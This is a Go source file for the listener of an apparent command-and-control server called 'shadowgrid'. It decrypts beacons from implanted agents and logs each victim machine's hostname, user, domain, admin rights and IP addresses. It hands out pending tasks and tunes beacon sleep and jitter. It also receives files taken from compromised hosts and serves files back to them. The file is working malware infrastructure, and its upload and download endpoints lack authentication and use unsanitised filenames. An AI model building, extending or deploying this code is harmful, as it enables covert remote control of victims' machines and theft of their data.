package listener

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"shadowgrid/config"
	sgcrypto "shadowgrid/crypto"
	"shadowgrid/database"
	"shadowgrid/models"
)

type Handler struct {
	DB     *database.DB
	Config *config.Config
}

type syncRequest struct {
	Session string `json:"session"`
	TS      int64  `json:"ts"`
}

type agentPayload struct {
	ID      string            `json:"id"`
	Profile map[string]interface{} `json:"profile"`
	Results []resultPayload   `json:"results"`
}

type resultPayload struct {
	TaskID     int    `json:"task_id"`
	Output     string `json:"output"`
	OutputType string `json:"output_type"`
	Status     string `json:"status"`
}

type syncResponse struct {
	Tasks  []taskPayload     `json:"tasks"`
	Config map[string]interface{} `json:"config"`
}

type taskPayload struct {
	ID   int             `json:"id"`
	Type string          `json:"type"`
	Args json.RawMessage `json:"args"`
}

func (h *Handler) HandleSync(w http.ResponseWriter, r *http.Request) {
	var req syncRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	// Decrypt
	plaintext, err := sgcrypto.Decrypt(req.Session, h.Config.AESKey)
	if err != nil {
		log.Printf("[SYNC] Decrypt failed: %v", err)
		http.Error(w, "unauthorized", 401)
		return
	}

	var payload agentPayload
	if err := json.Unmarshal(plaintext, &payload); err != nil {
		log.Printf("[SYNC] Invalid payload: %v", err)
		http.Error(w, "bad payload", 400)
		return
	}

	// Extract profile fields
	getString := func(m map[string]interface{}, key string) string {
		if v, ok := m[key]; ok {
			if s, ok := v.(string); ok {
				return s
			}
		}
		return ""
	}
	getFloat := func(m map[string]interface{}, key string) float64 {
		if v, ok := m[key]; ok {
			if f, ok := v.(float64); ok {
				return f
			}
		}
		return 0
	}
	getBool := func(m map[string]interface{}, key string) bool {
		if v, ok := m[key]; ok {
			if b, ok := v.(bool); ok {
				return b
			}
		}
		return false
	}

	agent := &models.Agent{
		ID:           payload.ID,
		Hostname:     getString(payload.Profile, "hostname"),
		Username:     getString(payload.Profile, "username"),
		OS:           getString(payload.Profile, "os"),
		Arch:         getString(payload.Profile, "arch"),
		ProcessName:  getString(payload.Profile, "process_name"),
		PID:          int(getFloat(payload.Profile, "pid")),
		IPInternal:   getString(payload.Profile, "ip_internal"),
		IPExternal:   r.RemoteAddr,
		Country:      getString(payload.Profile, "country"),
		DomainName:   getString(payload.Profile, "domain"),
		IsAdmin:      getBool(payload.Profile, "is_admin"),
		SleepSeconds: int(getFloat(payload.Profile, "sleep_seconds")),
		JitterPct:    int(getFloat(payload.Profile, "jitter_percent")),
		FirstSeen:    time.Now(),
		LastSeen:     time.Now(),
		Status:       "active",
	}

	// Upsert agent
	h.DB.UpsertAgent(agent)
	h.DB.UpdateAgentLastSeen(payload.ID)

	// Store results
	for _, res := range payload.Results {
		if res.OutputType == "" {
			res.OutputType = "text"
		}
		h.DB.CompleteTask(res.TaskID, res.Output, res.OutputType)
	}

	// Get pending tasks
	pendingTasks, _ := h.DB.GetPendingTasks(payload.ID)
	var taskPayloads []taskPayload
	for _, t := range pendingTasks {
		taskPayloads = append(taskPayloads, taskPayload{
			ID:   t.ID,
			Type: t.TaskType,
			Args: json.RawMessage(t.ArgsJSON),
		})
	}

	// Get agent config
	existingAgent, _ := h.DB.GetAgent(payload.ID)
	agentConfig := map[string]interface{}{
		"sleep":  5,
		"jitter": 20,
	}
	if existingAgent != nil {
		agentConfig["sleep"] = existingAgent.SleepSeconds
		agentConfig["jitter"] = existingAgent.JitterPct
	}

	resp := syncResponse{
		Tasks:  taskPayloads,
		Config: agentConfig,
	}

	respJSON, _ := json.Marshal(resp)
	encrypted, err := sgcrypto.Encrypt(respJSON, h.Config.AESKey)
	if err != nil {
		http.Error(w, "encryption error", 500)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"data": encrypted,
		"ts":   time.Now().Unix(),
	})
}

func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(100 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file", 400)
		return
	}
	defer file.Close()

	uploadDir := filepath.Join(h.Config.DataDir, "agent_uploads")
	os.MkdirAll(uploadDir, 0755)

	ts := time.Now().UnixNano()
	localPath := filepath.Join(uploadDir, strconv.FormatInt(ts, 10)+"_"+header.Filename)
	dst, err := os.Create(localPath)
	if err != nil {
		http.Error(w, "save error", 500)
		return
	}
	defer dst.Close()
	written, _ := io.Copy(dst, file)

	agentID := r.FormValue("agent_id")
	f := &models.File{
		AgentID:   agentID,
		Filename:  header.Filename,
		Filepath:  r.FormValue("filepath"),
		Size:      written,
		Direction: "download", // from agent = download to us
		LocalPath: localPath,
	}
	h.DB.CreateFile(f)
	h.DB.LogActivity("file", "Agent "+agentID+" uploaded "+header.Filename)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (h *Handler) HandleDownload(w http.ResponseWriter, r *http.Request) {
	// Extract ID from URL path
	idStr := filepath.Base(r.URL.Path)
	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, "invalid id", 400)
		return
	}
	f, err := h.DB.GetFile(id)
	if err != nil {
		http.Error(w, "not found", 404)
		return
	}
	http.ServeFile(w, r, f.LocalPath)
}
